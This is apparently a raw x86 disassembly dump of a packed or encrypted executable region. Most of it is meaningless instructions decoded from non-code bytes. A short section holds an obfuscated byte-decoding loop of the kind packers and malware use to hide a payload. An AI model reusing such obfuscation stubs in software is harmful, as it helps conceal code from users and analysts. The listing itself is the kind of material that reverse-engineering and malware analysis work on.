  4057fd:	rcl    BYTE PTR [esi+edx*1+0x1d],1
  405801:	adc    bl,BYTE PTR [edi+esi*1-0x1c533c2f]
  405808:	push   ss
  405809:	push   edi
  40580a:	rcr    DWORD PTR [edi+ebp*1-0x4294454e],cl
  405811:	ficomp WORD PTR [esi]
  405813:	daa    
  405814:	add    BYTE PTR [ecx-0x18],0x86
  405818:	aad    0x83
  40581a:	fisubr DWORD PTR [esi+0x2b2cfd83]
  405820:	pushf  
  405821:	inc    ecx
  405822:	sbb    eax,0x11c6c4e9
  405827:	outs   dx,BYTE PTR ds:[esi]
  405828:	(bad)  
  405829:	jl     0x405827
  40582b:	push   ss
  40582c:	(bad)  
  40582d:	cmp    edi,DWORD PTR ds:0x330b51c3
  405833:	mov    ch,0xf3
  405835:	xor    BYTE PTR [edx-0x135ad1ef],0x7
  40583c:	mov    cl,0x77
  40583e:	dec    esp
  40583f:	jno    0x405812
  405841:	cs jge 0x4058a0
  405844:	adc    eax,0x535a8e28
  405849:	sbb    dh,al
  40584b:	xchg   esp,eax
  40584c:	sbb    DWORD PTR [esp+ecx*4-0x1dc05de],ecx
  405853:	icebp  
  405854:	xor    eax,edi
  405856:	shl    DWORD PTR [edx],0xef
  405859:	adc    al,0x87
  40585b:	or     DWORD PTR [edx+eax*2],0xffffff8d
  40585f:	mov    ch,0x36
  405861:	push   edx
  405862:	(bad)  
  405863:	lea    esi,[edx+0x15]
  405866:	(bad)  
  405867:	mov    dh,BYTE PTR [edx+0x71778358]
  40586d:	mov    ecx,0xc1e44067
  405872:	add    eax,0xef976c9b
  405877:	sub    al,0xde
  405879:	push   ebx
  40587a:	pushf  
  40587b:	and    ebx,DWORD PTR [ebx-0x7]
  40587e:	pop    eax
  40587f:	iret   
  405880:	pop    ds
  405881:	in     al,dx
  405882:	je     0x4058ea
  405884:	mov    cl,0x72
  405886:	pop    ds
  405887:	cmp    cl,BYTE PTR [edi]
  405889:	cmp    al,0x9b
  40588b:	out    dx,al
  40588c:	retf   0x6302
  40588f:	pop    edx
  405890:	cld    
  405891:	push   edx
  405892:	jmp    esi
  405894:	add    al,0xb2
  405896:	aaa    
  405897:	in     al,dx
  405898:	and    al,0xf0
  40589a:	mov    edi,0x61a319f5
  40589f:	imul   ecx
  4058a1:	inc    edi
  4058a2:	loope  0x4058da
  4058a4:	sar    DWORD PTR [edx],0xcf
  4058a7:	push   edx
  4058a8:	fld    DWORD PTR [eax-0x46b7e9ac]
  4058ae:	and    ah,BYTE PTR [esi]
  4058b0:	and    edx,0x72
  4058b3:	push   edx
  4058b4:	sub    al,0xd8
  4058b6:	and    edx,DWORD PTR [edi-0x494cefb6]
  4058bc:	xchg   edx,eax
  4058bd:	jl     0x4058af
  4058bf:	mov    edx,0x40f4da8d
  4058c4:	mov    bl,BYTE PTR [ebx+0x5bf15096]
  4058ca:	or     eax,0x1a6ce238
  4058cf:	jecxz  0x405934
  4058d1:	xor    BYTE PTR [ebx-0x6],0x4e
  4058d5:	adc    dh,cl
  4058d7:	stos   DWORD PTR es:[edi],eax
  4058d8:	push   edx
  4058d9:	in     al,dx
  4058da:	sub    dh,BYTE PTR [edi-0x38]
  4058dd:	(bad)  
  4058de:	cs jbe 0x40594e
  4058e1:	jnp    0x4058f3
  4058e3:	xchg   ebp,eax
  4058e4:	jmp    0xb6b4dda7
  4058e9:	sti    
  4058ea:	adc    eax,DWORD PTR [esi+0x10]
  4058ed:	and    DWORD PTR [esi+eiz*4+0x22a6625f],eax
  4058f4:	jge    0x4058f6
  4058f6:	jle    0x405942
  4058f8:	repz or ch,BYTE PTR [eax]
  4058fb:	xchg   esp,eax
  4058fc:	xor    BYTE PTR [edx+0x1c],cl
  4058ff:	mov    ch,BYTE PTR [edi]
  405901:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405902:	and    ebp,DWORD PTR [ebx+0x5ce83cd9]
  405908:	sub    eax,0x448a2428
  40590d:	loopne 0x405891
  40590f:	leave  
  405910:	adc    BYTE PTR [esi+0xd5f20e4],0x5f
  405917:	mov    cl,0xaa
  405919:	fst    DWORD PTR [esi+0x51da0c34]
  40591f:	js     0x405950
  405921:	mov    ds:0x1469c5c9,eax
  405926:	repz dec edi
  405928:	clc    
  405929:	mov    ds:0xd6b0ee92,al
  40592e:	sahf   
  40592f:	imul   esi,esi,0x6d96727b
  405935:	sub    BYTE PTR [esi+0x47],dh
  405938:	or     bl,cl
  40593a:	lods   eax,DWORD PTR ds:[esi]
  40593b:	repz into 
  40593d:	arpl   WORD PTR [esi],dx
  40593f:	sahf   
  405940:	inc    ebp
  405942:	imul   edx,DWORD PTR [esp+eiz*2+0x13db47b1],0x4c
  40594a:	mov    eax,ds:0x3afe2751
  40594f:	rol    DWORD PTR [esi-0x3d],cl
  405952:	and    bh,BYTE PTR [ebx*4-0x78639b36]
  405959:	lds    ecx,FWORD PTR [edx+0x671acdf8]
  40595f:	and    DWORD PTR [esi-0x38c2ac0c],ecx
  405965:	adc    ch,BYTE PTR [esi+0x2f]
  405968:	aad    0xda
  40596a:	sti    
  40596b:	jo     0x40598d
  40596d:	fistp  QWORD PTR [edx]
  40596f:	out    dx,eax
  405970:	leave  
  405971:	pop    eax
  405972:	jmp    0x4059a7
  405974:	add    BYTE PTR [ecx],0x42
  405977:	(bad)  
  405978:	and    DWORD PTR [esi+0x38],ebx
  40597b:	inc    DWORD PTR [eax-0x69]
  40597e:	add    BYTE PTR [edi+0x7621a72e],cl
  405984:	xchg   DWORD PTR [ecx+0x5426e07],edx
  40598a:	aas    
  40598b:	ficom  WORD PTR [esi+0x7d4d68c4]
  405991:	push   esp
  405992:	test   BYTE PTR [edi-0x4d],bh
  405995:	stos   BYTE PTR es:[edi],al
  405996:	dec    esp
  405997:	int3   
  405998:	in     eax,0x21
  40599a:	aas    
  40599b:	jle    0x4059d5
  40599d:	retf   
  40599e:	add    edi,edx
  4059a0:	cwde   
  4059a1:	(bad)  
  4059a3:	clc    
  4059a4:	fadd   DWORD PTR [ebp-0x79]
  4059a7:	jge    0x405973
  4059a9:	inc    BYTE PTR [eax-0x7a80a822]
  4059af:	aad    0xd1
  4059b1:	push   ds
  4059b2:	mov    al,ds:0x172320da
  4059b7:	fadd   DWORD PTR [ecx-0x24]
  4059ba:	xchg   edx,eax
  4059bb:	shl    ch,0xd
  4059be:	sbb    al,0xe
  4059c0:	outs   dx,BYTE PTR ds:[esi]
  4059c1:	scas   eax,DWORD PTR es:[edi]
  4059c2:	pusha  
  4059c3:	or     DWORD PTR [esp+edx*8],esp
  4059c6:	adc    DWORD PTR [edx],edi
  4059c8:	adc    BYTE PTR [ebx-0xf],al
  4059cb:	pop    es
  4059cc:	test   BYTE PTR [eax-0x3bb0c39a],cl
  4059d2:	into   
  4059d3:	enter  0x9bc8,0x78
  4059d7:	fistp  WORD PTR [ecx-0x3ae7213d]
  4059dd:	fbld   TBYTE PTR ds:0x73a4f285
  4059e3:	add    ah,BYTE PTR [ebx+0x2d2028ac]
  4059e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4059ea:	sar    esp,cl
  4059ec:	add    dh,BYTE PTR [ebp-0x11]
  4059ef:	repnz inc ebx
  4059f1:	sub    bl,bl
  4059f3:	inc    ebp
  4059f4:	and    al,0xea
  4059f6:	cs cmp eax,0xeaf4ea28
  4059fc:	fst    QWORD PTR ds:0x79894049
  405a02:	hlt    
  405a03:	int3   
  405a04:	and    BYTE PTR [esi+edi*4-0xd6ef2c0],cl
  405a0b:	push   ds
  405a0c:	add    BYTE PTR [ecx-0x5f31bbff],bl
  405a12:	inc    esp
  405a13:	mov    esp,0x9fbf30
  405a18:	aas    
  405a19:	call   0x7ad4d500
  405a1e:	lds    ecx,FWORD PTR [ecx+0x58]
  405a21:	and    ch,BYTE PTR [edi+0x56]
  405a24:	mov    esi,0x168adac9
  405a29:	xor    al,0xc2
  405a2c:	jns    0x405a49
  405a2e:	cdq    
  405a2f:	shr    DWORD PTR [ecx-0x722895df],cl
  405a35:	pop    ebx
  405a36:	jae    0x405a67
  405a38:	dec    esp
  405a39:	inc    ebp
  405a3a:	mov    ebx,0x7f73a9f9
  405a3f:	cmp    dl,cl
  405a41:	adc    eax,0x2c8a8558
  405a46:	add    cl,BYTE PTR [ebx-0x76c832e9]
  405a4c:	xchg   ebx,eax
  405a4d:	jmp    0x405a16
  405a4f:	fwait
  405a50:	xchg   edx,edx
  405a52:	cmp    ecx,eax
  405a54:	mov    BYTE PTR [esi],ah
  405a56:	ficom  DWORD PTR [ebp+0x522ae481]
  405a5c:	jo     0x405ac3
  405a5e:	clc    
  405a5f:	and    esp,0x59182224
  405a65:	cmp    al,0xd7
  405a67:	fcom   QWORD PTR [edx+0x1b364366]
  405a6d:	mov    ebx,0x5aae381b
  405a72:	mov    bh,0x65
  405a74:	call   0x8f64f5f4
  405a79:	sar    DWORD PTR [esi+0x47663fb5],0xf5
  405a80:	jl     0x405ae3
  405a82:	dec    edx
  405a83:	hlt    
  405a84:	test   eax,0x2680fa87
  405a89:	int    0x92
  405a8b:	xchg   esi,eax
  405a8c:	std    
  405a8d:	adc    DWORD PTR [esp+esi*1],eax
  405a90:	xchg   ebp,eax
  405a91:	lds    ebx,FWORD PTR [edi+0x21]
  405a94:	pusha  
  405a95:	xchg   ebp,eax
  405a96:	xor    DWORD PTR [ecx+ebx*2-0x2946b6fa],0xffffffeb
  405a9e:	add    DWORD PTR [esi+edx*4-0x46],edx
  405aa2:	xchg   BYTE PTR [ebp+edx*1+0x352fd921],bh
  405aa9:	lods   eax,DWORD PTR ds:[esi]
  405aaa:	sar    eax,0xab
  405aad:	xchg   edi,eax
  405aae:	int3   
  405aaf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405ab0:	xchg   esi,eax
  405ab1:	stc    
  405ab2:	lods   al,BYTE PTR ds:[esi]
  405ab3:	sbb    cl,bh
  405ab5:	mov    ebp,0x1d1a88ea
  405aba:	in     eax,dx
  405abb:	in     eax,0x1d
  405abd:	mov    cl,al
  405abf:	popf   
  405ac0:	cdq    
  405ac1:	xchg   bl,bl
  405ac3:	cdq    
  405ac4:	sbb    eax,0xd2a1c93
  405ac9:	sbb    al,0x8a
  405acb:	mov    dl,0x2d
  405acd:	int    0x3d
  405acf:	shl    DWORD PTR [ebp+0x33340855],0x9c
  405ad6:	leave  
  405ad7:	call   0x6ec:0x989fe7e
  405ade:	rcl    BYTE PTR [edi-0x6533aba3],1
  405ae4:	mov    WORD PTR [eax+0x3da91b14],cs
  405aea:	dec    edi
  405aeb:	mov    edx,0x2a094b38
  405af0:	inc    eax
  405af1:	sub    DWORD PTR ds:0x9de3ca3c,esp
  405af7:	cmp    DWORD PTR [eax-0x39],edx
  405afa:	ja     0x405a9f
  405afc:	in     al,dx
  405afd:	repz loop 0x405ae4
  405b00:	neg    ch
  405b02:	arpl   WORD PTR ss:[edx+ebp*2],sp
  405b06:	push   ebx
  405b07:	jmp    0x8533062b
  405b0c:	inc    esi
  405b0d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405b0e:	inc    ecx
  405b0f:	out    0x69,eax
  405b11:	mov    ?,eax
  405b13:	mov    WORD PTR [esi-0x2bf52d],gs
  405b19:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405b1a:	inc    edi
  405b1b:	and    BYTE PTR [esi+0x47],cl
  405b1e:	dec    esi
  405b1f:	pop    esp
  405b20:	xor    esp,ecx
  405b22:	fs ja  0x405b8e
  405b25:	aas    
  405b26:	out    dx,al
  405b27:	getsec 
  405b29:	fcomi  st,st(0)
  405b2b:	popf   
  405b2c:	call   0x891c8e49
  405b31:	push   cs
  405b32:	mov    esp,0x9ce33c82
  405b37:	ss addr16 inc eax
  405b3a:	add    edi,DWORD PTR [esi-0x61b56256]
  405b40:	jle    0x405b72
  405b42:	cmp    esp,DWORD PTR [esi+ebp*4]
  405b45:	pop    edi
  405b46:	dec    eax
  405b47:	mov    eax,0x62c63f37
  405b4c:	addr16 inc edi
  405b4e:	cli    
  405b4f:	imul   esp,DWORD PTR [esp+ecx*4+0x21],0x58901fe3
  405b57:	mov    edi,0x4e0f369b
  405b5c:	les    ebp,FWORD PTR ds:0xa8a7771e
  405b62:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405b63:	sbb    eax,0xc3553e85
  405b68:	pushaw 
  405b6a:	hlt    
  405b6b:	inc    esp
  405b6c:	out    0xb,al
  405b6e:	inc    edx
  405b6f:	fild   QWORD PTR ds:0xcfc49aa2
  405b75:	call   0xb2f74763
  405b7a:	cmp    eax,0xd1125e
  405b7f:	mov    edi,0xf0501e5d
  405b84:	cmp    eax,0xa5e55a0c
  405b89:	test   eax,0xf9edf151
  405b8e:	inc    esp
  405b8f:	shr    BYTE PTR [esi-0x24],1
  405b92:	or     ebp,edi
  405b94:	in     al,0x10
  405b96:	ins    DWORD PTR es:[edi],dx
  405b97:	jg     0x405bd9
  405b99:	xchg   DWORD PTR [esi+0x7b407388],edx
  405b9f:	xchg   ebx,eax
  405ba0:	push   ebx
  405ba1:	or     eax,0xfe372fb9
  405ba6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405ba7:	cdq    
  405ba8:	jo     0x405be4
  405baa:	xor    al,0xf4
  405bac:	xchg   ebp,eax
  405bad:	test   DWORD PTR [eax+0x11],0xe7e9902d
  405bb4:	pop    es
  405bb5:	sbb    edx,DWORD PTR [edx+0x74]
  405bb8:	lock xor bl,BYTE PTR [ebp-0x5e]
  405bbc:	xchg   edx,eax
  405bbd:	jg     0x405bf6
  405bbf:	aam    0x59
  405bc1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405bc2:	out    dx,al
  405bc3:	mov    ah,0x81
  405bc5:	stos   DWORD PTR es:[edi],eax
  405bc6:	sub    DWORD PTR [edi+esi*1+0x295d38e6],eax
  405bcd:	xor    DWORD PTR [ecx+0x41],eax
  405bd0:	mov    dh,0x6f
  405bd2:	jmp    0x405ba3
  405bd4:	jmp    0x558d:0x3ee0a82
  405bdb:	pop    DWORD PTR [eax]
  405bdd:	ins    DWORD PTR es:[edi],dx
  405bde:	mov    esi,0xa4872878
  405be3:	test   eax,0x45d6017a
  405be8:	mov    eax,ds:0x2051f75b
  405bed:	sbb    BYTE PTR [edi+0x53],dl
  405bf0:	ror    edi,1
  405bf2:	pushf  
  405bf3:	in     al,dx
  405bf4:	push   es
  405bf5:	cdq    
  405bf6:	xchg   ebp,eax
  405bf7:	jecxz  0x405c1d
  405bf9:	or     dh,BYTE PTR [eax]
  405bfb:	stos   BYTE PTR es:[edi],al
  405bfc:	push   es
  405bfd:	xor    ebx,DWORD PTR [ebx]
  405bff:	mov    dl,0x15
  405c01:	ins    BYTE PTR es:[edi],dx
  405c02:	cmp    bl,ch
  405c04:	retf   
  405c05:	push   ss
  405c06:	pushf  
  405c07:	dec    esp
  405c08:	sbb    al,0xb0
  405c0a:	dec    esp
  405c0b:	clc    
  405c0c:	cmp    bl,BYTE PTR [edi]
  405c0e:	test   DWORD PTR [esi],esi
  405c10:	outs   dx,BYTE PTR ds:[esi]
  405c11:	and    edi,DWORD PTR [edx-0x4f]
  405c14:	dec    edx
  405c15:	pop    edi
  405c16:	push   edx
  405c17:	push   edx
  405c18:	enter  0xa26b,0xd4
  405c1c:	sub    eax,ebx
  405c1e:	cmp    edx,eax
  405c20:	jne    0x405caa
  405c26:	mov    eax,DWORD PTR [ebp-0xc]
  405c29:	mov    dl,BYTE PTR [eax+ecx*1+0x801]
  405c30:	mov    eax,DWORD PTR [ebp-0x20]
  405c33:	mov    ebx,DWORD PTR [ebp-0x18]
  405c36:	xor    eax,esi
  405c38:	xor    ebx,esi
  405c3a:	add    eax,edi
  405c3c:	add    ebx,edi
  405c3e:	mov    BYTE PTR [ebp-0x1],dl
  405c41:	cmp    eax,ebx
  405c43:	jae    0x405c98
  405c49:	lea    edx,[eax-0x3272ec]
  405c4f:	mov    DWORD PTR [ebp-0x14],edx
  405c52:	mov    ebx,DWORD PTR [ebp-0x14]
  405c55:	xor    ebx,esi
  405c57:	add    ebx,0x7f55d8f2
  405c5d:	lea    edx,[ebp+eax*4-0x3c]
  405c61:	mov    DWORD PTR [edx],ebx
  405c63:	mov    ebx,DWORD PTR [edx]
  405c65:	cmp    ebx,0x244ecb93
  405c6b:	jbe    0x405c7c
  405c71:	add    DWORD PTR [edx],0x405fcdc
  405c77:	jmp    0x405c82
  405c7c:	add    DWORD PTR [edx],0xfdaf4324
  405c82:	mov    edx,DWORD PTR [ebp-0x18]
  405c85:	xor    edx,esi
  405c87:	inc    eax
  405c88:	inc    DWORD PTR [ebp-0x14]
  405c8b:	add    edx,edi
  405c8d:	cmp    eax,edx
  405c8f:	jb     0x405c52
  405c95:	mov    dl,BYTE PTR [ebp-0x1]
  405c98:	xor    dl,0x79
  405c9b:	sub    dl,0x3
  405c9e:	xor    eax,eax
  405ca0:	mov    eax,DWORD PTR [ebp-0xc]
  405ca3:	mov    BYTE PTR [eax+ecx*1+0x801],dl
  405caa:	mov    eax,DWORD PTR [ebp-0xc]
  405cad:	mov    edx,DWORD PTR [ebp-0x20]
  405cb0:	sub    eax,edi
  405cb2:	xor    eax,esi
  405cb4:	cmp    eax,edx
  405cb6:	jne    0x40809e
  405cbc:	mov    eax,DWORD PTR [ebp-0x10]
  405cbf:	mov    edx,DWORD PTR [ebp-0x8]
  405cc2:	xor    eax,esi
  405cc4:	xor    edx,esi
  405cc6:	sub    eax,edx
  405cc8:	sub    eax,edi
  405cca:	xor    eax,esi
  405ccc:	mov    DWORD PTR [ebp-0x10],eax
  405ccf:	mov    eax,DWORD PTR [ebp-0x8]
  405cd2:	jmp    0x408090
  405cd7:	mov    eax,ds:0x7b519088
  405cdc:	dec    ecx
  405cdd:	mov    ds:0xeab98a78,eax
  405ce2:	fisub  WORD PTR [esp+esi*2-0x38]
  405ce6:	in     eax,dx
  405ce7:	cmp    al,0x33
  405ce9:	jp     0x405d65
  405ceb:	fstp   QWORD PTR [edi+0x7a]
  405cee:	jp     0x405ce7
  405cf0:	leave  
  405cf1:	push   ss
  405cf2:	dec    ebx
  405cf3:	mov    ds:0xed84f6e5,al
  405cf8:	aad    0xcd
  405cfa:	pop    ebx
  405cfb:	xor    esi,DWORD PTR [eax]
  405cfd:	iret   
  405cfe:	inc    eax
  405cff:	pop    ecx
  405d00:	and    edx,ebp
  405d02:	or     al,0xd1
  405d04:	adc    BYTE PTR [edi+0x200e842d],dh
  405d0a:	mov    eax,ds:0x6ba1980
  405d0f:	stos   DWORD PTR es:[edi],eax
  405d10:	test   BYTE PTR [edx-0x5a],ch
  405d13:	das    
  405d14:	and    al,0xc6
  405d16:	cwde   
  405d17:	inc    edi
  405d18:	int3   
  405d19:	stos   DWORD PTR es:[edi],eax
  405d1a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405d1b:	and    esi,DWORD PTR [edx]
  405d1d:	mov    bh,0xd8
  405d1f:	push   ebp
  405d20:	sbb    al,0x49
  405d22:	pop    ebx
  405d23:	xor    eax,0x11e92a70
  405d28:	test   BYTE PTR [edx],al
  405d2a:	adc    DWORD PTR [esi-0x4881f65a],0xffffffad
  405d31:	jg     0x405cbe
  405d33:	xor    BYTE PTR [esi+0x53],al
  405d36:	sub    BYTE PTR [ecx],bl
  405d38:	jno    0x405d43
  405d3a:	pop    edx
  405d3b:	and    DWORD PTR [esi],ecx
  405d3d:	fcmovne st,st(3)
  405d3f:	into   
  405d40:	push   ss
  405d41:	lods   al,BYTE PTR ds:[esi]
  405d42:	mov    esp,0x383505e7
  405d47:	pop    ebp
  405d48:	data16 mov dl,0x95
  405d4b:	call   0x859ba302
  405d50:	pop    eax
  405d51:	aad    0x5f
  405d53:	sar    BYTE PTR [ebp-0x27],1
  405d56:	xchg   DWORD PTR [esi+ebp*4+0x5463f169],edx
  405d5d:	inc    edi
  405d5e:	lods   al,BYTE PTR ds:[esi]
  405d5f:	cmp    dl,BYTE PTR [ebp-0x13332a1b]
  405d65:	and    dl,ch
  405d67:	mov    edi,0x9b531ff0
  405d6c:	cs in  al,dx
  405d6e:	jmp    0x6f9c:0xc37d2c50
  405d75:	sahf   
  405d76:	mov    esi,0x4b65ffd9
  405d7b:	push   ebx
  405d7c:	aaa    
  405d7d:	add    ebx,DWORD PTR [ebp+eax*1-0x65cc3da0]
  405d84:	sbb    ecx,DWORD PTR [edx-0x14]
  405d87:	mov    eax,ds:0xb3eae290
  405d8c:	pop    DWORD PTR [esi]
  405d8e:	adc    al,0x79
  405d90:	loopne 0x405df9
  405d92:	sbb    al,0x6a
  405d94:	je     0x405dcd
  405d96:	retf   0xa9a4
  405d99:	test   eax,0xe559d62c
  405d9e:	pop    esp
  405d9f:	(bad)  
  405da0:	(bad)  
  405da1:	push   ebp
  405da2:	pop    ebx
  405da3:	adc    DWORD PTR [edi-0x9],ebp
  405da6:	repnz pop ds
  405da8:	mov    cl,0xd4
  405daa:	stc    
  405dab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405dac:	test   DWORD PTR [edi+0x339ff85d],edi
  405db2:	xor    edi,ecx
  405db4:	bound  esi,QWORD PTR [edi-0x14]
  405db7:	and    BYTE PTR [ebx+0x7e],bh
  405dba:	mov    bl,0xc3
  405dbc:	mov    esp,0x3c9d8216
  405dc1:	mov    ebx,0xebbcf9ae
  405dc6:	xor    BYTE PTR [esi+0x1bf3fd6e],cl
  405dcc:	fcom   st(3)
  405dce:	or     eax,0xbe0add0c
  405dd3:	outs   dx,DWORD PTR ds:[esi]
  405dd4:	mov    eax,cs:0xfecbb0ab
  405dda:	loope  0x405d7f
  405ddc:	shl    DWORD PTR [edi],0xc4
  405ddf:	inc    esp
  405de0:	sti    
  405de1:	ja     0x405e60
  405de3:	sub    eax,0x4d9aa9b2
  405de8:	pop    esp
  405de9:	bound  esi,QWORD PTR [eax+0x8]
  405dec:	sbb    dh,BYTE PTR [ebx]
  405dee:	int3   
  405def:	in     eax,dx
  405df0:	jl     0x405e24
  405df2:	cwde   
  405df3:	in     al,0x62
  405df5:	rcr    BYTE PTR ds:0x4bdede2a,0x4e
  405dfc:	fldenv [ebx-0x386c695f]
  405e02:	pop    ebp
  405e03:	mov    eax,ds:0x84f2aa68
  405e08:	int3   
  405e09:	and    edx,edx
  405e0b:	push   edx
  405e0c:	fstp   DWORD PTR [eax+0x37]
  405e0f:	sahf   
  405e10:	mov    ebx,0x68b8a7e4
  405e15:	sbb    ebp,ebp
  405e17:	pushf  
  405e18:	pusha  
  405e19:	inc    ecx
  405e1a:	or     DWORD PTR [esi-0x36],esi
  405e1d:	sbb    al,0x6c
  405e1f:	std    
  405e20:	jns    0x405dbc
  405e22:	outs   dx,BYTE PTR ds:[esi]
  405e23:	icebp  
  405e24:	retf   0x3d80
  405e27:	adc    DWORD PTR [ebx],esp
  405e29:	mov    al,ds:0x5905e00c
  405e2e:	icebp  
  405e2f:	add    edx,ebp
  405e31:	ror    BYTE PTR [ebp-0x85a4c23],1
  405e37:	jl     0x405e35
  405e39:	jl     0x405e33
  405e3b:	outs   dx,DWORD PTR ds:[esi]
  405e3c:	ror    esi,0x6e
  405e3f:	sbb    edx,DWORD PTR [ebx]
  405e41:	bound  edi,QWORD PTR [esi+edi*8+0x2c]
  405e45:	sbb    al,0x98
  405e47:	sahf   
  405e48:	push   edx
  405e49:	pop    ebp
  405e4a:	shl    DWORD PTR [edx],0xd3
  405e4d:	in     al,0x37
  405e4f:	mov    esp,0xc276d745
  405e54:	jmp    0x405e52
  405e56:	(bad)  
  405e57:	pop    ebx
  405e58:	nop
  405e59:	sub    ah,al
  405e5b:	mov    dh,0x41
  405e5d:	cmp    al,0x73
  405e5f:	stos   BYTE PTR es:[edi],al
  405e60:	xchg   ebx,eax
  405e61:	ds repz jecxz 0x405e6e
  405e65:	jmp    0x680:0x426b32c7
  405e6c:	sahf   
  405e6d:	outs   dx,BYTE PTR ds:[esi]
  405e6e:	sub    edi,DWORD PTR [esi]
  405e70:	add    ah,BYTE PTR [ecx]
  405e72:	out    dx,al
  405e73:	xor    al,0x7c
  405e75:	mov    bl,0x8a
  405e77:	and    BYTE PTR [eax],0x39
  405e7a:	ins    BYTE PTR es:[edi],dx
  405e7b:	jp     0x405ecc
  405e7d:	mov    ecx,0xe0316fc3
  405e82:	jle    0x405e6a
  405e84:	sbb    eax,0x69178131
  405e89:	out    dx,al
  405e8a:	xor    eax,0x6a150be8
  405e8f:	mov    bh,0x4b
  405e91:	enter  0x2362,0xf7
  405e95:	repz add ch,al
  405e98:	rcl    BYTE PTR [edi-0xf73ab35],1
  405e9e:	mov    esp,esi
  405ea0:	arpl   WORD PTR [esi-0x28],ax
  405ea3:	dec    edx
  405ea4:	pop    ebp
  405ea5:	out    0x27,al
  405ea7:	mov    bl,0x15
  405ea9:	aad    0xe3
  405eab:	jmp    0x405eaf
  405ead:	call   0x4ac0f78a
  405eb2:	clc    
  405eb3:	js     0x405ecc
  405eb5:	cli    
  405eb6:	ficom  DWORD PTR [ecx]
  405eb8:	add    dh,cl
  405eba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405ebb:	out    0xdf,eax
  405ebd:	sbb    eax,0x2ab45064
  405ec2:	pop    edx
  405ec3:	mov    dl,0x1a
  405ec5:	arpl   WORD PTR [edx],bp
  405ec7:	jb     0x405eda
  405ec9:	xchg   ebx,eax
  405eca:	dec    eax
  405ecb:	hlt    
  405ecc:	out    dx,eax
  405ecd:	or     bl,0xca
  405ed0:	rcr    ecx,1
  405ed2:	xor    ch,BYTE PTR [edx]
  405ed4:	imul   esp,eax,0x5ff14309
  405eda:	push   0x777e3ed6
  405edf:	xor    eax,0xcf33935f
  405ee4:	ins    BYTE PTR es:[edi],dx
  405ee5:	fs in  eax,0xeb
  405ee8:	push   esi
  405ee9:	inc    ebx
  405eea:	xchg   esi,edi
  405eec:	and    eax,0x3a3d6776
  405ef1:	(bad)  
  405ef2:	mov    esi,fs
  405ef4:	rol    DWORD PTR [ebx+0x1f1a0d57],1
  405efa:	iret   
  405efb:	or     dh,bl
  405efd:	fsubr  DWORD PTR [edx+edx*8-0x34]
  405f01:	fcmovnb st,st(2)
  405f03:	jl     0x405ef1
  405f05:	lods   al,BYTE PTR ds:[esi]
  405f06:	inc    eax
  405f07:	add    edx,DWORD PTR [edi]
  405f09:	push   0x19befc88
  405f0e:	movaps xmm2,xmm1
  405f11:	jl     0x405ee6
  405f13:	pop    esi
  405f14:	out    dx,al
  405f15:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405f16:	dec    dh
  405f18:	(bad)  
  405f19:	or     al,ch
  405f1b:	pop    esi
  405f1c:	fs addr16 push 0x45f0a846
  405f23:	push   esi
  405f24:	jecxz  0x405ec3
  405f26:	xchg   esi,eax
  405f27:	push   esi
  405f28:	push   eax
  405f29:	arpl   sp,ax
  405f2b:	and    BYTE PTR [ecx],cl
  405f2d:	add    al,0x6e
  405f2f:	sbb    eax,0x2cd46100
  405f34:	xchg   edi,eax
  405f35:	pop    edi
  405f36:	das    
  405f37:	push   0xffffffa0
  405f39:	aaa    
  405f3a:	or     DWORD PTR [ecx-0x2f],esp
  405f3d:	stc    
  405f3e:	test   al,0xb4
  405f40:	xchg   ecx,eax
  405f41:	adc    esp,ebp
  405f43:	xor    BYTE PTR [edi],ch
  405f45:	pop    eax
  405f46:	(bad)  
  405f48:	mov    ebx,0x37fd3be8
  405f4d:	xchg   ebx,eax
  405f4e:	mov    esi,0xa59d0b28
  405f53:	adc    BYTE PTR ds:0xdb754446,ah
  405f59:	call   0x709f:0x510a1b53
  405f60:	dec    esp
  405f61:	push   edx
  405f62:	es cwde 
  405f64:	mov    ds:0x1e2ee924,al
  405f69:	jmp    0x87ac12a7
  405f6e:	scas   eax,DWORD PTR es:[edi]
  405f6f:	xchg   esp,eax
  405f70:	add    al,0xb0
  405f72:	sub    BYTE PTR [ecx+edx*2+0x6c],0x64
  405f77:	cmp    DWORD PTR [ecx],0x74
  405f7a:	aas    
  405f7b:	fcmovnu st,st(6)
  405f7d:	mov    cl,al
  405f7f:	arpl   dx,ax
  405f81:	cmp    eax,0x484a3f90
  405f86:	nop
  405f87:	push   0xffffff9c
  405f89:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405f8a:	lahf   
  405f8b:	gs loop 0x405f5d
  405f8e:	inc    edi
  405f8f:	inc    ebp
  405f90:	mov    bh,0xc9
  405f92:	mov    esi,DWORD PTR [esi+eax*4-0x44]
  405f96:	xor    eax,0xeb06bf57
  405f9b:	ins    DWORD PTR es:[edi],dx
  405f9c:	leave  
  405f9d:	adc    al,dl
  405f9f:	loop   0x405fd3
  405fa1:	scas   eax,DWORD PTR es:[edi]
  405fa2:	fs dec ebx
  405fa4:	(bad)  
  405fa6:	fidiv  WORD PTR [eax+0x27]
  405fa9:	in     al,dx
  405faa:	ins    DWORD PTR es:[edi],dx
  405fab:	nop
  405fac:	or     dl,bl
  405fae:	aad    0x5d
  405fb0:	ror    DWORD PTR [eax+0x46b5239],0x29
  405fb7:	mov    dh,0xb9
  405fb9:	jns    0x405fde
  405fbb:	xor    ebp,ebp
  405fbd:	jmp    0x12c671d0
  405fc2:	gs sbb eax,0x6b1e04a2
  405fc8:	fild   DWORD PTR [edx-0x186a050d]
  405fce:	xchg   BYTE PTR [edi-0x62a44b70],cl
  405fd4:	pop    ds
  405fd5:	enter  0x30ce,0x5f
  405fd9:	mov    dh,0xdb
  405fdb:	rol    BYTE PTR [edx+0x45],1
  405fde:	adc    al,0xc7
  405fe0:	pop    ebp
  405fe1:	jg     0x406048
  405fe3:	aaa    
  405fe4:	pop    esp
